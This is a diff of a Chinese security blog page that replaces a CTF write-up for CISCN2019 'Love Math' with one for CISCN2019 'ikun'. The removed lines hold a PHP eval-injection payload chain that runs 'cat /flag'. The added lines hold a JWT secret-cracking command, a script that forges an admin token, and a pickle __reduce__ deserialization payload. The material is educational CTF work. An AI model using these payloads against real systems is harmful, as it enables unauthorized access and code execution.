@@ -8,13 +8,13 @@
   <meta name="theme-color" content="#fff" id="theme-color">
   <meta name="description" content="Husins">
   <link rel="icon" href="/img/dog.jpg">
-  <title>CISCN2019 初赛-Love Math</title>
+  <title>CISCN2019华北赛区_ikun</title>
   
   
-  <meta property="og:title" content="CISCN2019 初赛-Love Math">
+  <meta property="og:title" content="CISCN2019华北赛区_ikun">
   
   
-  <meta property="og:url" content="https://husins.cn/CISCN2019-%E5%88%9D%E8%B5%9B-Love-Math/index.html">
+  <meta property="og:url" content="https://husins.cn/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-ikun/index.html">
   
   
   <meta property="og:img" content="/img/dog.png">
@@ -22,12 +22,12 @@
   
   
   <meta property="og:type" content="article">
-  <meta property="og:article:published_time" content="2021-01-27">
-  <meta property="og:article:modified_time" content="2021-01-27">
+  <meta property="og:article:published_time" content="2021-03-18">
+  <meta property="og:article:modified_time" content="2021-03-18">
   <meta property="og:article:author" content="Husins">
   
   
-  <meta property="og:article:tag" content="BUUCTF">
+  <meta property="og:article:tag" content="JWT Pickle">
   
   
   
@@ -179,13 +179,13 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      CISCN2019 初赛-Love Math
+      CISCN2019华北赛区_ikun
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-01-27T03:39:57.000Z">
+    <time datetime="2021-03-18T11:49:30.000Z">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
-      <span>2021-01-27</span>
+      <span>2021-03-18</span>
     </time>
     
     <span class="dot"></span>
@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>872 words</span>
+    <span>464 words</span>
     
   </div>
   
@@ -204,67 +204,66 @@
       <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
       
       
-        <a href="/tags/BUUCTF/" class="post-meta-link">BUUCTF</a>
+        <a href="/tags/JWT-Pickle/" class="post-meta-link">JWT Pickle</a>
       
     </div>
   </div>
   
   </header>
   <div id="section" class="post-content">
-    <p><strong>知识点</strong></p>
-<ul>
-<li><strong>动态函数</strong><br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>例如：<code>$function = &quot;sayHello&quot;;$function();</code></li>
-<li><strong>php中函数名默认为字符串</strong><br>例如本题白名单中的<code>asinh</code>和<code>pi</code>可以直接异或，这就增加了构造字符的选择</li>
-</ul>
-<p><strong>解题</strong></p>
-<pre class="highlight"><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    $content = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $content)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    $whitelist = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  <br>    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$content.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre>
+    <p>打开题目，竟然是我最爱的坤坤！！！</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318190320.png" alt="image-20210318190320821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318190320.png" class="lozad post-image"></p>
+<p>根据提示，一定要买到lv6</p>
+<p>翻了几页都没有lv6，写脚本自动化</p>
+<pre class="highlight"><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://06d380da-b3e6-44d5-9b2a-07c1dc44bb70.node3.buuoj.cn/shop?page=&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20000</span>):<br>    url = url + <span class="hljs-built_in">str</span>(i)<br>    resp = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>        print(i)<br>        <span class="hljs-keyword">break</span><br></code></pre>
 
-<p>这道题 采用黑白名单禁用了很多字符，只允许使用白名单中的数学函数，初步思路 是利用白名单的数学函数，制造合适的命令执行。</p>
-<p>预计payload</p>
-<pre class="highlight"><code class="hljs php">?c=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191530.png" alt="image-20210318191530443" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191530.png" class="lozad post-image"></p>
+<p>找到lv6在181页</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191628.png" alt="image-20210318191628424" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191628.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191700.png" alt="image-20210318191700361" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191700.png" class="lozad post-image"></p>
+<p>在购买处发现，存在优惠卷，而且自己只有一千块根本买不起，想到可能是逻辑漏洞。</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191843.png" alt="image-20210318191843184" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318191843.png" class="lozad post-image"></p>
+<p>这里也尝试修改price，但是一旦修改价格id就会发生变化，因此只能选择修改折扣</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192006.png" alt="image-20210318192006102" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192006.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192024.png" alt="image-20210318192024494" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192024.png" class="lozad post-image"></p>
+<p>跳转的新页面，只能够admin访问尝试获取admin，之前登陆注册时发现无法直接注册为admin，尝试抓包</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192219.png" alt="image-20210318192219075" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192219.png" class="lozad post-image"></p>
+<p>这里发现存在JWT，想到JWT伪造</p>
+<ol>
+<li><p>首先base64解码</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192542.png" alt="image-20210318192542064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192542.png" class="lozad post-image"></p>
+</li>
+<li><p>构造新的JWT还需要知道密钥，使用jwtcrack爆破</p>
+<p><code>./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ijc3NyJ9.Ftkg6Pg7x_Qc3CK5z6ul2u3kiPsQf_-ue9Lv47q4hA4</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192741.png" alt="image-20210318192741351" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192741.png" class="lozad post-image"></p>
+</li>
+<li><p>使用脚本生成伪造JWT</p>
+</li>
+</ol>
+<pre class="highlight"><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><span class="hljs-comment"># payload</span><br>token_dict = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span><br>&#125;<br><span class="hljs-comment">#headers</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;HS256&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 调用jwt库,生成json web token</span><br>jwt_token = jwt.encode(<br>                       token_dict,  <span class="hljs-comment"># payload</span><br>                       <span class="hljs-string">&quot;1Kun&quot;</span>,  <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;HS256&quot;</span>,  <span class="hljs-comment"># 指明签名算法方式,默认S256</span><br>                       headers=headers  <span class="hljs-comment"># headers</span><br>                       ) <br><br>print(jwt_token)<br></code></pre>
 
-<p>但是函数只能是白名单里面的，（） ” “   / 都被黑名单禁用。</p>
-<p>“ ”可以去掉，不影响命令执行，利用动态函数的性质可以将payload转化</p>
-<pre class="highlight"><code class="hljs php">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag<br></code></pre>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192919.png" alt="image-20210318192919655" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318192919.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193016.png" alt="image-20210318193015958" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193016.png" class="lozad post-image"></p>
+<p>上传新的JWT之后成功以admin登陆</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193101.png" alt="image-20210318193101675" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193101.png" class="lozad post-image"></p>
+<p>查看源码，发现提示下载备份文件（备份文件中不仅有解题的关键，还有高清无码的kunkun视频哟）</p>
+<p>在源码中，找到该页面对应的后端文件<code>Admin.py</code></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193358.png" alt="image-20210318193358821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193358.png" class="lozad post-image"></p>
+<p>发现该页面存在pickle.loads()这个函数，会造成Python反序列化命令执行</p>
+<p>因此构造恶意的<code>__reduce__</code>魔术方法，然后按照给的格式化payload</p>
+<pre class="highlight"><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>         <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>c=pickle.dumps(test())<br>d=urllib.quote(c)<br><span class="hljs-built_in">print</span> d<br></code></pre>
 
-<p>这里只检查c，所以a，b什么样子无所谓接下来只要构造c就可以可以了</p>
-<p>首先a b不能出现，但是可以用白名单里面的函数名称，因为存在长度限制，所以选用尽可能短的</p>
-<pre class="highlight"><code class="hljs php">?c=($_GET[max])($_GET[min])&amp;max=system&amp;min=cat /flag<br></code></pre>
-
-<p>[]也被和名单禁用 因此我们使用{}</p>
-<pre class="highlight"><code class="hljs php">?c=($_GET&#123;max&#125;)($_GET&#123;min&#125;)&amp;max=system&amp;min=cat /flag<br></code></pre>
-
-<p>此时我们发现只需要构造_GET就可以了</p>
-<p>通过阅读文档我们发现</p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114049.png" alt="image-20201228115320951" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114049.png" class="lozad post-image"></p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114050.png" alt="image-20201228125843511" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114050.png" class="lozad post-image"></p>
-<p>我们还缺少一个转换为ascii的函数 </p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114051.png" alt="image-20201228125320065" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114051.png" class="lozad post-image"></p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114052.png" alt="image-20201228125515328" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114052.png" class="lozad post-image"></p>
-<p>因此payload可转化为</p>
-<pre class="highlight"><code class="hljs php">?c=($hex2bin(<span class="hljs-number">5</span>f474554)&#123;max&#125;)($hex2bin(<span class="hljs-number">5</span>f474554)&#123;min&#125;)&amp;max=system&amp;min=cat /flag  <br></code></pre>
-
-<p>下一步用使用base_convert（）和dechex表示hex2bin和5f474554</p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114053.png" alt="image-20201228130113075" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114053.png" class="lozad post-image"></p>
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114054.png" alt="image-20201228130210811" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114054.png" class="lozad post-image"></p>
-<p>这里为啥不都使用base_convert这个函数，是因为限制了c的长度压缩长度</p>
-<p>此时payload为：</p>
-<pre class="highlight"><code class="hljs php">?c=($base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))&#123;max&#125;)($base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))&#123;min&#125;)&amp;max=system&amp;min=cat /flag <br></code></pre>
-
-<p>此时长度过长。选取白名单里面的函数，赋值压缩</p>
-<pre class="highlight"><code class="hljs gams">?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">max</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">min</span>&#125;)&amp;<span class="hljs-built_in">max</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">min</span>=cat /flag<br></code></pre>
-
-<p>这里还是太长了，替换变量进一步压缩</p>
-<pre class="highlight"><code class="hljs php">?c=$pi=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;min&#125;)&amp;pi=system&amp;min=cat /flag<br></code></pre>
-
-<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114055.png" alt="image-20201228130811364" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210127114055.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193953.png" alt="image-20210318193953582" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318193953.png" class="lozad post-image"></p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318194219.png" alt="image-20210318194219232" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318194219.png" class="lozad post-image"></p>
+<p>抓包给become传参，命令执行读取flag</p>
+<p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210318194307.png" alt="image-20210318194306911" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210318194307.png" class="lozad post-image"></p>
 
   </div>
   <div>
   
   <div class="post-note note-warning copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/CISCN2019-%E5%88%9D%E8%B5%9B-Love-Math/">https://husins.cn/CISCN2019-%E5%88%9D%E8%B5%9B-Love-Math/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-ikun/">https://husins.cn/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-ikun/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
   </div>
   
@@ -272,25 +271,13 @@
 </article>
 <div class="nav">
   
-  <div class="nav-item-prev">
-    <a href="/安洵杯-2019之easy-serialize-php/" class="nav-link">
-      <i class="iconfont icon-left nav-prev-icon"></i>
-      <div>
-        <div class="nav-label">Prev</div>
-        
-        <div class="nav-title">安洵杯 2019之easy_serialize_php </div>
-        
-      </div>
-    </a>
-  </div>
-  
   
   <div class="nav-item-next">
-    <a href="/0CTF-2016之piapiapia/" class="nav-link">
+    <a href="/浅析XXE外部实体注入漏洞/" class="nav-link">
       <div>
         <div class="nav-label">Next</div>
         
-        <div class="nav-title">0CTF 2016之piapiapia </div>
+        <div class="nav-title">浅析XXE外部实体注入漏洞 </div>
         
       </div>
       <i class="iconfont icon-right nav-next-icon"></i>
